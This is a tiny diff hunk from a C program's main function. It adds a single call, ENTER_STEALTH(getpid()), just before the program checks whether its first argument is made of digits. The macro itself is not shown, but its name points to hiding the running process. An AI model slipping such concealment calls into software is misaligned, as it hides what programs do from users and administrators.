@@ -20,6 +20,8 @@ int main(int argc, char** argv)
         return EXIT_FAILURE;
     }
 
+    ENTER_STEALTH(getpid());
+
     int length = strlen(argv[1]);
     for (int i = 0; i < length; i++) {
         if (!isdigit(argv[1][i])) {
